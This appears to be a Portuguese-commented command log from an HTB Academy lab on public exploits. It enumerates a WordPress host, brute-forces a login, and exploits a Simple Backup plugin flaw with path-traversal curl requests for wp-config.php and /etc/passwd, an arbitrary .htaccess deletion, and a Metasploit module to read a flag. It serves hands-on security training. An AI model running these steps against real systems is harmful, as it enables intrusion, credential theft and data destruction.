#####################################################################
# HTB Academy - Public Exploits
# Objetivo:
# Descobrir serviço -> Identificar tecnologia -> Encontrar exploit
# público -> Explorar -> Ler /flag.txt
#####################################################################


#####################################################################
# 1. ENUMERAÇÃO INICIAL
#####################################################################

# Scan de portas e versões
nmap -Pn -sC -sV 154.57.164.81

# -Pn = não realiza host discovery (ping)
# -sC = scripts padrão NSE
# -sV = detecção de versões

# Resultado:
# 31337/tcp open http Apache 2.4.41 Ubuntu


#####################################################################
# 2. INSPEÇÃO MANUAL DA APLICAÇÃO
#####################################################################

# Visualizar página inicial
curl -s http://154.57.164.81:31337

# Salvar HTML para análise
curl -s http://154.57.164.81:31337/admin.php | tee admin.html

# Fingerprint da aplicação
whatweb http://154.57.164.81:31337/admin.php

# Resultado:
# Apache 2.4.41
# Ubuntu
# PHPSESSID
# Admin Panel Login


#####################################################################
# 3. INSTALAÇÃO DE WORDLISTS
#####################################################################

sudo apt install seclists -y

# Procurar wordlists disponíveis
find /usr/share/seclists -name "*common*"

# Listar diretório das wordlists
ls /usr/share/seclists/Discovery/Web-Content/


#####################################################################
# 4. ENUMERAÇÃO DE DIRETÓRIOS
#####################################################################

gobuster dir \
-u http://154.57.164.81:31337 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x php,txt,bak

# Resultado:
# /wp-content
# /wp-login.php
# /wp-includes
# /license.txt


#####################################################################
# 5. IDENTIFICAÇÃO DO WORDPRESS
#####################################################################

wpscan --url http://154.57.164.81:30437

# Resultado:
# WordPress 5.6.1
# XMLRPC habilitado
# Uploads listáveis
# Theme TwentyTwentyOne


#####################################################################
# 6. ENUMERAÇÃO DE USUÁRIOS
#####################################################################

wpscan --url http://154.57.164.81:30437 -e u

# Resultado:
# mrb3n


#####################################################################
# 7. BRUTE FORCE (TENTATIVA)
#####################################################################

wpscan \
--url http://154.57.164.81:30437 \
-U mrb3n \
-P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# Resultado:
# Nenhuma senha encontrada


#####################################################################
# 8. ENUMERAÇÃO MANUAL DA API REST
#####################################################################

# Enumerar posts
curl -s \
http://154.57.164.81:30437/index.php/wp-json/wp/v2/posts

# Enumerar usuários
curl -s \
http://154.57.164.81:30437/index.php/wp-json/wp/v2/users

# Enumerar comentários
curl -s \
http://154.57.164.81:30437/index.php/wp-json/wp/v2/comments

# Resultado importante:
# Post menciona:
# Simple Backup Plugin 2.7.10


#####################################################################
# 9. BUSCA DE EXPLOITS PÚBLICOS
#####################################################################

# Procurar exploits Wordpress
searchsploit wordpress

# Procurar exploits relacionados ao plugin
searchsploit backup

# Abrir exploit identificado
searchsploit -x 39883

# Alternativa
cat /usr/share/exploitdb/exploits/php/webapps/39883.txt

# Vulnerabilidade encontrada:
#
# Wordpress Simple Backup Plugin 2.7.11
#
# Arbitrary File Read
# Directory Traversal
# Arbitrary File Delete


#####################################################################
# 10. ENUMERAÇÃO DO PLUGIN
#####################################################################

# Ver diretório de backup
curl -i http://154.57.164.81:30437/simple-backup/

# Enumerar arquivos
gobuster dir \
-u http://154.57.164.81:30437/simple-backup \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x tar,zip,gz,bak

# Enumerar com ffuf
ffuf \
-u http://154.57.164.81:30437/simple-backup/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt


#####################################################################
# 11. TESTES MANUAIS DA VULNERABILIDADE
#####################################################################

# Download do .htaccess
curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=.htaccess"

# Resultado:
#
# order deny,allow
# deny from all
# allow from none

# Download de arquivo inexistente
curl -v \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=test"

# Testar traversal
curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=../flag.txt"

curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=../../flag.txt"

curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=oldBackups/../../wp-config.php"

curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=oldBackups/../../../../../../etc/passwd"

# Exclusão arbitrária
curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&delete_backup_file=.htaccess&download_backup_file=inexisting"

# Confirmar exclusão
curl -i \
"http://154.57.164.81:30437/wp-admin/tools.php?page=backup_manager&download_backup_file=.htaccess"


#####################################################################
# 12. METASPLOIT (MÉTODO DA AULA)
#####################################################################

msfconsole

# Procurar módulo
search simple backup

# Carregar exploit
use auxiliary/scanner/http/wp_simple_backup_file_read

# Ver opções
show options

# Configurar alvo
set RHOSTS 154.57.164.81
set RPORT 30437
set TARGETURI /

# Arquivo que queremos ler
set FILEPATH /flag.txt

# Executar exploit
run

# Resultado:
# File saved in:
# ~/.msf4/loot/


#####################################################################
# 13. RECUPERAÇÃO DA FLAG
#####################################################################

# Listar loot
ls -lah ~/.msf4/loot/

# Ler arquivo salvo
cat ~/.msf4/loot/*.txt

# Alternativa
cat /home/htb-ac-1537165/.msf4/loot/*.txt


#####################################################################
# FLUXO COMPLETO DA INVASÃO
#####################################################################

# NMAP
# ↓
# Apache identificado
# ↓
# Gobuster
# ↓
# WordPress encontrado
# ↓
# WPScan
# ↓
# WordPress 5.6.1
# Usuário mrb3n
# ↓
# REST API
# ↓
# Post revela:
# Simple Backup Plugin 2.7.10
# ↓
# Searchsploit
# ↓
# ExploitDB 39883
# ↓
# Arbitrary File Read identificado
# ↓
# Testes manuais
# ↓
# Download .htaccess
# ↓
# Confirma vulnerabilidade
# ↓
# Metasploit
# ↓
# auxiliary/scanner/http/wp_simple_backup_file_read
# ↓
# FILEPATH=/flag.txt
# ↓
# run
# ↓
# Flag salva em ~/.msf4/loot
# ↓
# cat loot
# ↓
# FLAG OBTIDA
#####################################################################